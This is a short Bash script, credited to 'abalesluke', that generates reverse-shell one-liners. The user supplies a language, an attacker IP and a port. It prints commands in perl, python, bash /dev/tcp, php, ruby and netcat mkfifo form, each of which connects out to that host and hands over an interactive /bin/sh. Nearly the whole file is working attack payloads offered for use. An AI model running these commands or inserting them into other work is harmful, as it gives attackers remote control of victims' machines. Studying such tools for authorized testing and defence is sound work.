#!/bin/bash
# by: </abalesluke>

help() {
    echo "Usage: revshell <language> <ip> <port>"
    echo "Available languages:"
    echo "  perl, python, bash, php, ruby, netcat"
    echo "Examples:"
    echo "  $0 perl 127.0.0.1 4444"
    echo "  $0 bash 127.0.0.1 1337"
}

generate_shell() {
    local lang="$1"
    local ip="$2"
    local port="$3"

    case "$lang" in
        perl)
            echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
            ;;
        python)
            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            ;;
        bash)
            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
            ;;
        php)
            echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ;;
        ruby)
            echo "ruby -rsocket -e 'TCPSocket.new(\"$ip\", $port).tap { |s| exec('/bin/sh -i', :in => s, :out => s, :err => s) }'"
            ;;
        netcat | nc)
            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
            ;;
        *)
            help
            echo ""
            echo "[Error]: revshell not found! '$lang'"
            exit
            ;;
    esac
}

if [ "$#" -lt 2 ]; then
    help
    exit
fi

lang="$1"
ip="$2"
port="$3"

if [ -z "$port" ]; then
    echo "[Error]: Missing port!"
    help
    exit
fi

generate_shell "$lang" "$ip" "$port"
